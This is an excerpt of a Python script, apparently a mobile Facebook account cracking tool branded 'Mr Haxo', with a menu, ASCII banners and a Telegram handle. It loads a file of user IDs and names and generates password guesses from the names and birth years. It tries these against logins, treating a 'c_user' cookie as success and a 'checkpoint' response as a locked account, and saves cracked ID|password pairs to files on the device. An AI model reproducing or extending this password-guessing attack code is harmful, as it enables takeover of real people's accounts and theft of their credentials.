...
#os.system('espeak -a 300 " Welcome,   to,  Haxo,  Cracker,  Tools"')
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
...
''
''
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐅𝐎𝐑 𝐓𝐎𝐎𝐋 𝐌𝐑 𝐇𝐀𝐗𝐎          ")
time.sleep(0.05)
''
logo=("""
██▒▒▒▒██▒▒▒▒███▒▒▒▒██▒▒▒▒██▒▒▒▒█████▒▒
...
def ikb():   
    os.system('clear')
    print(logo)
    print('\x1b[1;97m[\x1b[1;92m🟧\x1b[1;97m] 𝐒𝐓𝐀𝐓𝐔𝐒   : \x1b[1;92mONLINE\x1b[1;97m');time.sleep(0.03) 
    print(42*'-')
    print('\x1b[1;96m[ 1 ] \x1b[1;97m𝐂𝐑𝐀𝐂𝐊 𝐖𝐈𝐓𝐇 𝐅𝐈𝐋𝐄  \x1b[1;92m[VIP]')
    print(42*'-')
    
    _ikb___ = input('\x1b[1;96m[=\x1b[1;96m]\x1b[1;97m 𝐂𝐇𝐎𝐎𝐒𝐄 :  \x1b[1;92m')
    if _ikb___ in ('1', '01'):
        file()
    if _ikb___ in ('?', '0?'):
    	mysocial()
...
def file():
				clear()
				''
				print(' \x1b[1;94mExample ➔ : ‌\x1b[1;92m/sdcard/Haxo.txt ')
				linex()
				file = input(' \x1b[1;97mPaste Your File :\x1b[1;92m ')
				try:
				...
				plist = []
				''
				print('  Telegram ➔ @ Mr_Haxo ');linex();print(' \x1b[1;94m[ 1 ] \x1b[1;92mCrack Auto Password \n \x1b[1;94m[ 2 ] \x1b[1;97mCrack Choice Password');linex()
				ppp=input(' Choose: ')
				if ppp in ['1','01']:
					plist.append('first last')
					plist.append('First Last')
					plist.append('firstlast')
					plist.append('first1994')
					plist.append('first1993')
					plist.append('first1992')
					plist.append('first1990')
					plist.append('first1991')
				...
				linex()
				print(' \033[1;34m[ 1 ]\033[1;32m ➟ Add Password Vip This Script ')
				linex()
				cx=input(' Choose: ')
				if cx in ['1','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('N  CP DEYAR BET ??? ')
...
""")					
					''
					print(' \033[    𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐒 \033[1;37m ➟ ㅤ  \033[1;32m'+total_ids+f' ')
					linex()
					for user in fo:
...
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;32m [ 𝐌𝐑 𝐇𝐀𝐗𝐎 ] %s|\033[1;32m𝐎𝐊 : %s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [𝐇𝐀𝐗𝐎-𝐎𝐊] %s | %s '%(ids,pas))
                                os.system('espeak -a 300 " Haxo,   CRACKER,  Haxo,   OK"')
                                open(f'/sdcard/𝐇𝐀𝐗𝐎-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[ [𝐇𝐀𝐗𝐎-𝐂𝐏] '+ids+' | '+pas+'')
                                        open(f'/sdcard/𝐇𝐀𝐗𝐎-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;32m [ 𝐇𝐀𝐗𝐎 𖣂 ] %s|\033[1;32mOK %s   \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def separate():
    ...
    if "/sdcard/" not in new_save:
        ...
        main_menu()
    try:
        limit = int(input('\033[1;32mHow many ? \033[0;97m'))
    except:
        limit = 1
    y = 0
    ...
    print('\033[1;32mNew file saved as: /storage/emulated/0/'+new_save)
    print(47*'-')
    ''
    input('\033[1;32m🪂😳👽😱🤤☃️☠🪂 ')
    ikb()
